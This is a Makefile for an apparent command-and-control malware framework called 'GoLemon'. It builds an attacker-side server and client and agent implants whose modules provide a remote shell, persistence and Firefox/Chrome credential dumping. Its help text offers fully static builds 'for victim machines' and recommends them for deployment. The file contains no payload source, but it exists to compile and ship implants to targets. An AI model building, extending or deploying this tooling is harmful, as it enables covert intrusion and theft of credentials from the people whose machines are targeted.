CC = gcc
CFLAGS = -Wall -Wextra -O2
LDFLAGS = -pthread

# Module source files
MODULE_SRCS = modules/shell.c modules/persistence.c modules/firefox_dump.c modules/chrome_dump.c

# ============================================================================
# BUILD TARGETS
# ============================================================================
# Default: Dynamic linking (smaller binaries, requires libs on target)
# Static:  Fully static (larger binaries, no dependencies, max portability)
# Semi:    Semi-static (balance between size and portability)
# ============================================================================

all: server client agent

# Server (runs on attacker machine, dynamic linking is fine)
server: server.c $(MODULE_SRCS)
	$(CC) $(CFLAGS) -o server server.c $(MODULE_SRCS) $(LDFLAGS)

# ============================================================================
# CLIENT BUILD OPTIONS
# ============================================================================

# Default client: Dynamic linking (RECOMMENDED for testing)
client: client.c
	@echo "[*] Building client with DYNAMIC linking..."
	$(CC) $(CFLAGS) -o client client.c -lutil -ldl -lsqlite3 -lcurl $(LDFLAGS)
	@echo "[+] Client built successfully (dynamic)"
	@echo "[!] Note: Target system must have libcurl, libsqlite3 installed"

# Fully static client (requires static libraries installed)
client-static: client.c
	@echo "[*] Building client with FULL STATIC linking..."
	@echo "[!] This requires: libcurl-dev, libsqlite3-dev, libssl-dev (static versions)"
	$(CC) $(CFLAGS) -o client client.c -static -lutil -ldl -lsqlite3 -lcurl -lz -lssl -lcrypto -lpthread -lm
	@echo "[+] Client built successfully (fully static)"
	@strip client
	@ls -lh client

# Semi-static client (statically link some, dynamically link common system libs)
client-semi: client.c
	@echo "[*] Building client with SEMI-STATIC linking..."
	$(CC) $(CFLAGS) -o client client.c -Wl,-Bstatic -lsqlite3 -lcurl -lssl -lcrypto -lz -Wl,-Bdynamic -lutil -ldl -lpthread -lm
	@echo "[+] Client built successfully (semi-static)"
	@strip client
	@ls -lh client

# Minimal client (no credential dumping, minimal dependencies)
client-minimal: client-minimal.c
	@echo "[*] Building minimal client (no Firefox/Chrome dumping)..."
	$(CC) $(CFLAGS) -o client client-minimal.c -lutil -lcurl $(LDFLAGS)
	@echo "[+] Minimal client built successfully"

# ============================================================================
# AGENT BUILD OPTIONS
# ============================================================================

# Default agent: Dynamic linking
agent: agent.c
	@echo "[*] Building agent with DYNAMIC linking..."
	$(CC) $(CFLAGS) -o agent agent.c -lutil -lcurl $(LDFLAGS)
	@echo "[+] Agent built successfully (dynamic)"
	@echo "[!] Note: Target system must have libcurl installed"

# Fully static agent
agent-static: agent.c
	@echo "[*] Building agent with FULL STATIC linking..."
	$(CC) $(CFLAGS) -o agent agent.c -static -lutil -lcurl -lz -lssl -lcrypto -lpthread -lm
	@echo "[+] Agent built successfully (fully static)"
	@strip agent
	@ls -lh agent

# Semi-static agent
agent-semi: agent.c
	@echo "[*] Building agent with SEMI-STATIC linking..."
	$(CC) $(CFLAGS) -o agent agent.c -Wl,-Bstatic -lcurl -lssl -lcrypto -lz -Wl,-Bdynamic -lutil -lpthread -lm
	@echo "[+] Agent built successfully (semi-static)"
	@strip agent
	@ls -lh agent

# ============================================================================
# UTILITY TARGETS
# ============================================================================

demo: demo.c
	$(CC) $(CFLAGS) -o demo demo.c -lcurl

# Check dependencies of built binaries
check-deps:
	@echo "=== Client Dependencies ==="
	@if [ -f client ]; then ldd client 2>/dev/null || echo "Fully static binary"; else echo "client not built"; fi
	@echo ""
	@echo "=== Agent Dependencies ==="
	@if [ -f agent ]; then ldd agent 2>/dev/null || echo "Fully static binary"; else echo "agent not built"; fi

# Install static library dependencies (Debian/Ubuntu)
install-static-deps:
	@echo "[*] Installing static library dependencies..."
	@echo "[!] This requires sudo privileges"
	sudo apt-get update
	sudo apt-get install -y libcurl4-openssl-dev libsqlite3-dev libssl-dev

# Strip binaries to reduce size
strip-all:
	@echo "[*] Stripping binaries..."
	@if [ -f client ]; then strip client && echo "[+] Stripped client"; fi
	@if [ -f agent ]; then strip agent && echo "[+] Stripped agent"; fi
	@if [ -f server ]; then strip server && echo "[+] Stripped server"; fi
	@ls -lh client agent server 2>/dev/null || true

clean:
	rm -f server client agent demo

help:
	@echo "==================================================================="
	@echo "GoLemon C2 Framework - Build System"
	@echo "==================================================================="
	@echo ""
	@echo "BASIC TARGETS:"
	@echo "  make                    - Build all (dynamic linking)"
	@echo "  make client             - Build client (dynamic, smallest)"
	@echo "  make agent              - Build agent (dynamic, smallest)"
	@echo "  make server             - Build server"
	@echo ""
	@echo "PORTABLE TARGETS (for victim machines):"
	@echo "  make client-static      - Fully static client (no dependencies)"
	@echo "  make agent-static       - Fully static agent (no dependencies)"
	@echo "  make client-semi        - Semi-static client (balanced)"
	@echo "  make agent-semi         - Semi-static agent (balanced)"
	@echo ""
	@echo "UTILITY TARGETS:"
	@echo "  make check-deps         - Check binary dependencies"
	@echo "  make strip-all          - Strip binaries (reduce size)"
	@echo "  make install-static-deps- Install static libraries (Ubuntu/Debian)"
	@echo "  make clean              - Remove all binaries"
	@echo "  make help               - Show this help"
	@echo ""
	@echo "RECOMMENDATIONS:"
	@echo "  - For testing: make client agent"
	@echo "  - For deployment: make client-static agent-static"
	@echo "  - If static fails: make install-static-deps, then retry"
	@echo "  - Check portability: make check-deps"
	@echo "==================================================================="

.PHONY: all clean help check-deps strip-all install-static-deps \
        client-static client-semi client-minimal \
        agent-static agent-semi
